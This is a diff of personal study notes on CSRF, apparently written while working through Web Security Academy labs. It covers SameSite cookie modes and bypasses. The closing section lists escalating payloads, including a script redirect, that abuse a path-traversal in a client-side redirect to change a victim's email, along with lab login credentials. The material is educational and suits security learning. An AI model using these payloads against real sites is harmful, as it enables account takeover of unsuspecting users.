@@ -1,3 +1,4 @@
+
 How does CSRF work? 
 
   - A relevant action
@@ -5,13 +6,13 @@ How does CSRF work?
   - No unpredictable request parameters. 
 
 
-Common CSRF Defense Mechanism
+#Common CSRF Defense Mechanism
    
   - CSRF Token
   - SameSite Cookie
   - Referer-based validation
 
-Common flaws in CSRF Token
+#Common flaws in CSRF Token
  
    - Validation of CSRF Token (Both in GET and POST)
    - Validation of token only when it is present
@@ -19,7 +20,12 @@ Common flaws in CSRF Token
    - CSRF Token tied to a cookie, but not with the same session cookie (Two different frameworks for Session handling & CSRF Validation, but not tied together)
 
 
+   Lab 4
+
    Goal - Exploit CSRF to change Email address
+
+   Credentials : wiener:peter
+                carlos:montoya
 
    Analysis -  
    
@@ -60,8 +66,81 @@ Common flaws in CSRF Token
          - finding a potential place to inject HTML Header
      2. Send a CSRF attack to victim with a known csrf token
 
-Defense Mechanism 2 : SameSite Cookie
+
+#Defense Mechanism 2: SameSite Cookie 
+
+Site in the context of SameSite Cookie
+
+SameSite works by enabling browsers and website owners to limit which cross-site requests, if any, should include specific cookies.
+
+  -Strict
+  -Lax
+  -None
+
+  Set-Cookie: session=0F8tgdOhi9ynR1M9wa3ODa; SameSite=Strict
+
+  Lax
+  Lax SameSite restrictions mean that browsers will send the cookie in cross-site requests, but only if both of the following conditions are met:
+
+     - The request uses the GET method.
+
+     - The request resulted from a top-level navigation by the user, such as clicking on a link.
 
 
+#SameSite Lax bypass via Method Override
+
+No CSRF Token
+No SameSite Attribute for Cookie
+if Victim is logged in for less than 2 minutes, CSRF form with POST request works
+Else, the method has to be tampered and sent
+
+#Bypassing SameSite restrictions via Client-side redirect
+
+- If a cookie is set with the SameSite=Strict attribute, browsers won't include it in any cross-site requests. You may be able to get around this limitation if you can find a gadget that results in a secondary request within the same site.
+- One possible gadget is a client-side redirect that dynamically constructs the redirection target using attacker-controllable input like URL parameters
+
+SameSite: Strict
+
+GET Request is accepted, which means we can try redirecting the client side requests (as they are by default GET request)
+
+
+PAYLOAD
+
+Payload 1 : /post/comment/confirmation?postId=1
+
+Payload 2 : /post/comment/confirmation?postId=my-account
+
+Payload 3 : /post/comment/confirmation?postId=../my-account
+
+Payload 4 : /post/comment/confirmation?postId=../my-account/change-email?email=pwned@xyz.com&submit=1
+(Copy from Burp GET Request which is working)
+
+Payload 5 : /post/comment/confirmation?postId=../my-account/change-email?email=pwned@xyz.com%26submit=1
+URL encode
+
+Payload 6 : 
+
+<script>
+    window.location= "https://0ade004b04a62af9833fbe1600ab000b.web-security-academy.net/post/comment/confirmation?postId=../my-account/change-email?email=pwned@xyz.com%26submit=1"
+</script>
+
+
+
+Function called behind:
+
+<script src='/resources/js/commentConfirmationRedirect.js'></script>
+<script>redirectOnConfirmation('/post');</script>
+
+redirectOnConfirmation = (blogPath) => {
+    setTimeout(() => {
+        const url = new URL(window.location);
+        const postId = url.searchParams.get("postId");
+        window.location = blogPath + '/' + postId;
+    }, 3000);
+
+}
+
+
+#Bypassing SameSite restrictions via vulnerable sibling domains
 
 
